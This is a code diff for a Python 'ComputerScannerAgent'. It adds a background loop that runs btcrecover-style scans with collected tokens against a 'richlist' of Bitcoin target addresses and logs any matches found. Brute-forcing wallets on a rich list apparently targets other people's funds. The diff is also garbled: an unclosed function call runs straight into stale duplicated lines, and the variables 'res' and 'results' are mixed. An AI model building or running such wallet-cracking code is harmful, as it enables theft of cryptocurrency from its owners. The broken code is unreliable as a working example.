@@ -231,6 +231,25 @@ class ComputerScannerAgent:
         # If a scan is already running, we trigger a targeted recovery scan
         # with the new intelligence.
         if self.is_running and (tokens or addresses):
+            print("[ComputerScanner] Intelligence update received during active scan")
+            self._recovery_event.set()
+
+    def _recovery_loop(self):
+        print("[ComputerScanner] Recovery engine loop started")
+        while self.is_running:
+            # Wait for intelligence or periodic timeout
+            self._recovery_event.wait(timeout=300)
+            if not self.is_running: break
+
+            self._recovery_event.clear()
+
+            if not self.btc_recover_tokens or not self._richlist:
+                continue
+
+            with self._recovery_lock:
+                print(f"[ComputerScanner] Running recovery scan with {len(self.btc_recover_tokens)} tokens against {len(self._richlist)} targets")
+                try:
+                    res = run_btcrecover_scan(
             print("[ComputerScanner] Intelligence update received during active scan - triggering recovery loop")
             self._recovery_event.set()
         # Trigger an immediate recovery scan pass with the new intelligence
@@ -266,6 +285,23 @@ class ComputerScannerAgent:
                         workers=os.cpu_count() or 4
                     )
 
+                    self.stats["recovery_attempts"] += res.get("attempts", 0)
+
+                    if res["found"]:
+                        for match in res["matches"]:
+                            self.stats["recovery_matches"] += 1
+                            hit = ScanHit(
+                                artifact_type=f"Recovery Match ({match.get('type')})",
+                                path=f"recovery:{match.get('coin', 'btc')}",
+                                addresses={match.get('coin', 'btc').lower(): match['address']},
+                                balances={},
+                                metadata=match,
+                                timestamp=datetime.now(timezone.utc)
+                            )
+                            self._hit_queue.put(hit)
+                            print(f"[ComputerScanner] MATCH FOUND: {match['address']} ({match.get('type')})")
+                except Exception as e:
+                    print(f"[ComputerScanner] Recovery scan error: {e}")
                     self.stats["recovery_attempts"] += results["attempts"]
 
                     if results["found"]:
